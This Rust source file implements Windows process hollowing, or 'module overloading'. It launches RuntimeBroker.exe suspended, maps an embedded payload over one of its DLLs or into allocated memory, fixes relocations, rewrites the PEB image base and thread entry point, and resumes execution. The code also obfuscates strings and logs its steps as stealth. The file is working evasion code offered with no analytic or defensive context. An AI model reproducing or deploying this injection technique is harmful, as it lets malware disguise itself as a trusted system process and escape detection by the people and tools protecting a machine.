#![allow(non_snake_case)]

#[cfg(feature = "evasion")]
use crate::recovery::helpers::payload::{allow_disk_fallback, get_embedded_payload};
use crate::recovery::helpers::pe::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
#[cfg(feature = "evasion")]
use crate::recovery::settings::RecoveryControl;
#[cfg(feature = "evasion")]
use crate::stack_str;
#[cfg(feature = "evasion")]
use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
#[cfg(feature = "evasion")]
use tracing::{debug, error, info, warn};
#[cfg(not(feature = "evasion"))]
use tracing::debug;
use windows::Win32::System::Diagnostics::Debug::{
    CONTEXT, CONTEXT_FLAGS, GetThreadContext, SetThreadContext, WriteProcessMemory,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_PROTECTION_FLAGS, VirtualAllocEx, VirtualProtectEx,
};
use windows::Win32::System::ProcessStatus::{
    K32EnumProcessModules, K32GetModuleInformation, MODULEINFO,
};
use windows::Win32::System::Threading::{
    CREATE_SUSPENDED, CreateProcessW, PROCESS_INFORMATION, ResumeThread, STARTUPINFOW,
};
use windows::core::{PCWSTR, PWSTR};

#[repr(C)]
pub struct IMAGE_BASE_RELOCATION {
    pub virtual_address: u32,
    pub size_of_block: u32,
}

const IMAGE_REL_BASED_DIR64: u16 = 10;
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;

pub async fn perform_hollowing() -> bool {
    #[cfg(feature = "evasion")]
    {
        if !RecoveryControl::global().evasion_enabled() {
            return false;
        }

        let args: Vec<String> = env::args().collect();
        if args.contains(&"--hollowed".to_string()) {
            debug!("already running in hollowed process");
            return false;
        }

        info!("attempting module overloading for stealth");

        let target_str = stack_str!(
            'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3',
            '2', '\\', 'R', 'u', 'n', 't', 'i', 'm', 'e', 'B', 'r', 'o', 'k', 'e', 'r', '.', 'e', 'x',
            'e'
        );
        let target = &target_str;

        let payload_bytes = if let Some(bytes) = get_embedded_payload() {
            debug!("using embedded payload from memory (stealthy)");
            bytes
        } else {
            if !allow_disk_fallback() {
                error!("embedded payload missing and disk fallback is disabled");
                return false;
            }

            warn!("falling back to disk read for payload (noisy)");
            let Ok(current_exe_path) = env::current_exe() else {
                return false;
            };
            match std::fs::read(&current_exe_path) {
                Ok(bytes) => bytes,
                Err(e) => {
                    error!("failed to read payload from disk: {}", e);
                    return false;
                }
            }
        };

        match run_overloaded(&payload_bytes, target) {
            Ok(_) => {
                info!(
                    "successfully overloaded into {}, signaling for exit",
                    target
                );
                true
            }
            Err(e) => {
                error!("module overloading failed: {}", e);
                false
            }
        }
    }

    #[cfg(not(feature = "evasion"))]
    false
}

pub fn run_overloaded(
    payload_bytes: &[u8],
    target_path: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut payload_bytes = payload_bytes.to_vec();
    unsafe {
        let mut si: STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();

        let target_w: Vec<u16> = OsStr::new(target_path)
            .encode_wide()
            .chain(Some(0))
            .collect();

        let mut command_line: Vec<u16> = OsStr::new(&format!("\"{}\" --hollowed", target_path))
            .encode_wide()
            .chain(Some(0))
            .collect();

        CreateProcessW(
            PCWSTR(target_w.as_ptr()),
            PWSTR(command_line.as_mut_ptr()),
            None,
            None,
            false,
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        )
        .map_err(|e| format!("failed to create target process: {}", e))?;

        let _pi_guard = ProcessInformationGuard(pi);

        let dos_header = &*(payload_bytes.as_ptr() as *const IMAGE_DOS_HEADER);
        let nt_headers = &*(payload_bytes.as_ptr().add(dos_header.e_lfanew as usize)
            as *const IMAGE_NT_HEADERS64);
        let payload_size = nt_headers.optional_header.size_of_image as usize;

        let mut h_modules = [windows::Win32::Foundation::HMODULE::default(); 1024];
        let mut cb_needed = 0;
        K32EnumProcessModules(
            pi.hProcess,
            h_modules.as_mut_ptr(),
            std::mem::size_of_val(&h_modules) as u32,
            &mut cb_needed,
        )
        .ok()
        .map_err(|e| e.to_string())?;

        let count = cb_needed as usize / std::mem::size_of::<windows::Win32::Foundation::HMODULE>();
        let mut target_base = std::ptr::null_mut();

        for i in 0..count {
            let mut mod_info = MODULEINFO::default();
            K32GetModuleInformation(
                pi.hProcess,
                h_modules[i],
                &mut mod_info,
                std::mem::size_of::<MODULEINFO>() as u32,
            )
            .ok()
            .map_err(|e| e.to_string())?;

            if mod_info.SizeOfImage as usize >= payload_size {
                let mut path_buf = [0u16; 1024];
                let len = windows::Win32::System::ProcessStatus::K32GetModuleFileNameExW(
                    pi.hProcess,
                    h_modules[i],
                    &mut path_buf,
                );
                let path = String::from_utf16_lossy(&path_buf[..len as usize]).to_lowercase();

                if !path.contains("ntdll.dll")
                    && !path.contains("kernel32.dll")
                    && !path.contains("kernelbase.dll")
                {
                    target_base = mod_info.lpBaseOfDll;
                    debug!(target_dll = %path, size = mod_info.SizeOfImage, "found target DLL for overloading");
                    break;
                }
            }
        }

        if target_base.is_null() {
            target_base = VirtualAllocEx(
                pi.hProcess,
                None,
                payload_size,
                MEM_COMMIT | MEM_RESERVE,
                windows::Win32::System::Memory::PAGE_READWRITE,
            );
        }

        if target_base.is_null() {
            return Err("failed to find or allocate memory in target process".into());
        }

        let delta = target_base as isize - nt_headers.optional_header.image_base as isize;
        if delta != 0 {
            let reloc_dir =
                &nt_headers.optional_header.data_directory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if reloc_dir.size > 0 {
                let mut current_reloc_offset = rva_to_offset(
                    reloc_dir.virtual_address,
                    nt_headers,
                    payload_bytes.as_ptr(),
                )?;
                let max_reloc_offset = current_reloc_offset + reloc_dir.size as usize;

                while current_reloc_offset < max_reloc_offset {
                    let reloc_block = &*(payload_bytes.as_ptr().add(current_reloc_offset)
                        as *const IMAGE_BASE_RELOCATION);
                    if reloc_block.size_of_block == 0 {
                        break;
                    }

                    let entries_count = (reloc_block.size_of_block as usize
                        - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                        / 2;
                    let entries_ptr = payload_bytes
                        .as_ptr()
                        .add(current_reloc_offset + std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                        as *const u16;

                    for i in 0..entries_count {
                        let entry = *entries_ptr.add(i);
                        let reloc_type = entry >> 12;
                        let reloc_offset = entry & 0xFFF;

                        if reloc_type == IMAGE_REL_BASED_DIR64 {
                            let target_rva = reloc_block.virtual_address + reloc_offset as u32;
                            let target_file_offset =
                                rva_to_offset(target_rva, nt_headers, payload_bytes.as_ptr())?;

                            let val_ptr =
                                payload_bytes.as_mut_ptr().add(target_file_offset) as *mut i64;
                            *val_ptr += delta as i64;
                        }
                    }
                    current_reloc_offset += reloc_block.size_of_block as usize;
                }
            }
        }

        let mut old_prot = PAGE_PROTECTION_FLAGS::default();
        VirtualProtectEx(
            pi.hProcess,
            target_base,
            payload_size,
            windows::Win32::System::Memory::PAGE_READWRITE,
            &mut old_prot,
        )
        .map_err(|e| e.to_string())?;

        WriteProcessMemory(
            pi.hProcess,
            target_base,
            payload_bytes.as_ptr() as *const _,
            nt_headers.optional_header.size_of_headers as usize,
            None,
        )
        .map_err(|e| e.to_string())?;

        let section_header_ptr = (payload_bytes
            .as_ptr()
            .add(dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()))
            as *const IMAGE_SECTION_HEADER;
        for i in 0..nt_headers.file_header.number_of_sections {
            let section = &*section_header_ptr.add(i as usize);
            if section.size_of_raw_data > 0 {
                let remote_section_dest = (target_base as usize + section.virtual_address as usize)
                    as *mut std::ffi::c_void;
                let local_section_src = payload_bytes
                    .as_ptr()
                    .add(section.pointer_to_raw_data as usize)
                    as *const std::ffi::c_void;

                WriteProcessMemory(
                    pi.hProcess,
                    remote_section_dest,
                    local_section_src,
                    section.size_of_raw_data as usize,
                    None,
                )
                .map_err(|e| e.to_string())?;
            }
        }

        for i in 0..nt_headers.file_header.number_of_sections {
            let section = &*section_header_ptr.add(i as usize);
            if section.size_of_raw_data > 0 {
                let remote_section_dest = (target_base as usize + section.virtual_address as usize)
                    as *mut std::ffi::c_void;
                let is_executable = (section.characteristics & 0x20000000) != 0;
                let is_writable = (section.characteristics & 0x80000000) != 0;

                let prot = if is_executable {
                    windows::Win32::System::Memory::PAGE_EXECUTE_READ
                } else if is_writable {
                    windows::Win32::System::Memory::PAGE_READWRITE
                } else {
                    windows::Win32::System::Memory::PAGE_READONLY
                };
                let mut temp = PAGE_PROTECTION_FLAGS::default();
                let _ = VirtualProtectEx(
                    pi.hProcess,
                    remote_section_dest,
                    section.size_of_raw_data as usize,
                    prot,
                    &mut temp,
                );
            }
        }

        let mut context: CONTEXT = std::mem::zeroed();
        context.ContextFlags = CONTEXT_FLAGS(0x100000 | 0x1 | 0x2 | 0x4); // CONTEXT_AMD64_FULL
        GetThreadContext(pi.hThread, &mut context).map_err(|e| e.to_string())?;

        #[cfg(target_arch = "x86_64")]
        {
            let peb_base = context.Rdx;
            let image_base_offset = peb_base + 0x10;
            WriteProcessMemory(
                pi.hProcess,
                (image_base_offset) as *const _,
                &target_base as *const _ as *const _,
                std::mem::size_of::<usize>(),
                None,
            )
            .map_err(|e| e.to_string())?;
            context.Rcx =
                target_base as u64 + nt_headers.optional_header.address_of_entry_point as u64;
            SetThreadContext(pi.hThread, &context).map_err(|e| e.to_string())?;
        }

        ResumeThread(pi.hThread);

        Ok(())
    }
}

fn rva_to_offset(
    rva: u32,
    nt_headers: &IMAGE_NT_HEADERS64,
    base_ptr: *const u8,
) -> Result<usize, Box<dyn std::error::Error>> {
    unsafe {
        let section_header_ptr = (base_ptr.add(
            (*(base_ptr.add(0x3C) as *const i32)) as usize
                + std::mem::size_of::<IMAGE_NT_HEADERS64>(),
        )) as *const IMAGE_SECTION_HEADER;
        for i in 0..nt_headers.file_header.number_of_sections {
            let section = &*section_header_ptr.add(i as usize);
            if rva >= section.virtual_address && rva < section.virtual_address + section.misc {
                return Ok((rva - section.virtual_address + section.pointer_to_raw_data) as usize);
            }
        }
    }
    Err("failed to map RVA to file offset".into())
}

struct ProcessInformationGuard(PROCESS_INFORMATION);

impl Drop for ProcessInformationGuard {
    fn drop(&mut self) {
        unsafe {
            if !self.0.hProcess.is_invalid() {
                let _ = windows::Win32::Foundation::CloseHandle(self.0.hProcess);
            }
            if !self.0.hThread.is_invalid() {
                let _ = windows::Win32::Foundation::CloseHandle(self.0.hThread);
            }
        }
    }
}
